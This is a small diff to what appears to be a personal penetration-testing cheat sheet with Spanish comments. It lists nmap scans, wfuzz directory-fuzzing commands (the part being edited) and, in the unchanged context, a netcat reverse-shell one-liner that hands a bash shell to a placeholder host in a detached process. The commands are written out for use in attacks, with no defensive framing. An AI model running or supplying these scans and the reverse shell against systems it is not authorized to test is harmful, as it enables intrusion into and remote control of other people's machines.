@@ -12,7 +12,9 @@ nmap -sC -sV -p21,22,80,443,8080 X.X.X.X -oN nmap_detailled
 nmap --script http-enum -p80 X.X.X.X -oN ScanWeb
 
 ##WEB FUZZING##
-wfuzz -c -hc=500 -t 500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://x.x.x.x
+wfuzz -c -hc=500 -t 500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://x.x.x.x/FUZZ.FUZZ
+wfuzz -c -hc=500 -t 500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w diccionario2.txt http://x.x.x.x/FUZZ.FUZ2Z
+
 
 ##REVERSE SHELL##
 nohup nc -e /bin/bash X.X.X.X 1234 & --> shell con proceso independiente
